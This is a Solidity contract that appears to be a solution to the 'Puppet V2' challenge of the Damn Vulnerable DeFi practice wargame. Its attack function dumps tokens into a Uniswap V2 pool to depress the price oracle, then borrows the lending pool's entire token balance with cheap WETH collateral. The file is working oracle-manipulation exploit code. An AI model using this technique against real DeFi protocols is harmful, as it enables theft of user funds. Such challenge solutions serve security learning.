//Idea: dump tokens, then borrow back from pool

pragma solidity =0.8.25;

import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
import {WETH} from "solmate/tokens/WETH.sol";


contract PuppetExploitV2 {
    IUniswapV2Router02 uniswapV2Router;
    DamnValuableToken token;
    PuppetV2Pool pool;
    WETH weth;
    address recovery;

    constructor(IUniswapV2Router02 _uniswapV2Router, DamnValuableToken _token, PuppetV2Pool _pool, WETH _weth, address _recovery) payable{
        uniswapV2Router = _uniswapV2Router;
        token = _token;
        pool = _pool;
        weth = _weth;
        recovery = _recovery;
    }

    function attack(uint256 exploitAmount) public {
        // Attack idea: dump all DVT into uniswap to drive the price down, then recover all tokens from pool at a low price
        // using borrow with WETH as collateral

        //Dump the token into uniswap
        uint256 tokenBalance = token.balanceOf(address(this));
        token.approve(address(uniswapV2Router), tokenBalance);

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        uniswapV2Router.swapExactTokensForETH(tokenBalance, 1, path, address(this), block.timestamp);

        //Convert weth to eth
        weth.deposit{value: address(this).balance}();

        //Borrow all DVT from the pool
        weth.approve(address(pool), weth.balanceOf(address(this)));
        pool.borrow(exploitAmount);
        token.transfer(recovery, exploitAmount);
    }

    receive() payable external{    }
}